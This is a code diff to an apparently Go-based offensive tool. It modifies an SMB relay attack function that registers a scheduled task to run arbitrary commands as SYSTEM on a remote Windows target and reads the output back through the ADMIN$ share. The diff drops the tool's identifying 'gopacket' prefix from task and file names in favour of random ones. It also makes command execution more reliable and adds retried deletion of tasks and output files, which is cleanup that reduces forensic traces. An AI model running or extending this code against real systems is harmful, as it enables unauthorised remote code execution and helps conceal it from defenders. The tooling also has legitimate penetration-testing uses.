@@ -17,7 +17,6 @@ package relay
 import (
 	"fmt"
 	"log"
-	"math/rand"
 	"strings"
 	"time"
 
@@ -179,20 +178,22 @@ func tschExecAttack(client *SMBRelayClient, cfg *Config) error {
 
 	ts := tsch.NewTaskScheduler(rpcClient)
 
-	// The task writes its output to a target temp file; reading it back proves
-	// the command actually executed (Impacket behavior).
-	outFile := fmt.Sprintf("gopacketout%04x.tmp", rand.Intn(0xFFFF))
+	// Random names (no tool-identifying prefix). The task writes its output to a
+	// target temp file terminated by a completion marker; finding the marker on
+	// read-back proves the command ran to completion (Impacket-style verify).
+	outFile := randomName() + ".tmp"
 	remoteOut := "Temp\\" + outFile // relative to ADMIN$ (= %SystemRoot%)
 
 	rl := &runLog{}
 	rl.Printf("[*] Executing command on target via Task Scheduler...")
 
-	// Generate random task name (matches Impacket pattern)
-	taskName := fmt.Sprintf("\\gopacket%04x", rand.Intn(0xFFFF))
+	// Generate random task name
+	taskName := "\\" + randomName()
 
 	// Build task XML (matches Impacket's XML template)
 	// Runs as SYSTEM with HighestAvailable run level
-	taskXML := buildTaskXML(fmt.Sprintf("%s > %%SystemRoot%%\\%s 2>&1", cfg.Command, remoteOut))
+	taskXML := buildTaskXML(fmt.Sprintf("%s > %%SystemRoot%%\\%s 2>&1 & echo %s >> %%SystemRoot%%\\%s",
+		cfg.Command, remoteOut, cmdDoneMarker, remoteOut))
 
 	if build.Debug {
 		rl.Printf("[D] TschExec: registering task %s", taskName)
@@ -213,36 +214,54 @@ func tschExecAttack(client *SMBRelayClient, cfg *Config) error {
 		rl.Printf("[*] Task executed")
 	}
 
-	// Wait for the task to write its output, then download it.
+	// Poll for the output file until the completion marker appears (the file is
+	// created at command start, so existence alone does not mean it finished).
 	var output []byte
 	found := false
 	for i := 0; i < 20; i++ {
 		time.Sleep(500 * time.Millisecond)
-		if data, derr := client.DownloadFile("ADMIN$", remoteOut); derr == nil {
+		data, derr := client.DownloadFile("ADMIN$", remoteOut)
+		if derr != nil {
+			continue
+		}
+		if strings.Contains(string(data), cmdDoneMarker) {
 			output = data
 			found = true
 			break
 		}
 	}
 
-	// Delete task
-	if err := ts.Delete(actualPath); err != nil {
-		rl.Printf("[-] Warning: failed to delete task %s: %v", actualPath, err)
+	// Delete task (retried — the relay session can be flaky after the task runs)
+	var delErr error
+	for attempt := 0; attempt < 3; attempt++ {
+		if delErr = ts.Delete(actualPath); delErr == nil {
+			break
+		}
+		time.Sleep(500 * time.Millisecond)
+	}
+	if delErr != nil {
+		rl.Printf("[-] Warning: failed to delete task %s after retries: %v", actualPath, delErr)
 	} else {
 		rl.Printf("[*] Task %s deleted", actualPath)
 	}
 
-	if found {
-		if err := client.DeleteFile("ADMIN$", remoteOut); err != nil {
-			rl.Printf("[-] Warning: could not delete %s on target: %v", remoteOut, err)
+	// Always best-effort remove the temp output file, success or not.
+	if derr := client.DeleteFile("ADMIN$", remoteOut); derr != nil {
+		if found {
+			rl.Printf("[-] Warning: could not delete %s on target: %v", remoteOut, derr)
+		} else {
+			verboseLog("[-] Best-effort delete of %s failed: %v", remoteOut, derr)
 		}
-	} else {
-		rl.Printf("[-] No output file from target (%s) — command did not execute", remoteOut)
-		return fmt.Errorf("command did not execute on %s (no output file %s)", cfg.TargetAddr, remoteOut)
 	}
 
-	if len(output) > 0 {
-		rl.Printf("[+] Command output:\n%s", strings.TrimRight(string(output), "\r\n"))
+	if !found {
+		rl.Printf("[-] No completed output from target (%s) — command did not execute (no file or missing %s marker)", remoteOut, cmdDoneMarker)
+		return fmt.Errorf("command did not execute on %s (no completion marker in %s)", cfg.TargetAddr, remoteOut)
+	}
+
+	text := strings.TrimSpace(strings.ReplaceAll(string(output), cmdDoneMarker, ""))
+	if text != "" {
+		rl.Printf("[+] Command output:\n%s", text)
 	} else {
 		rl.Printf("[*] Command executed (no output)")
 	}
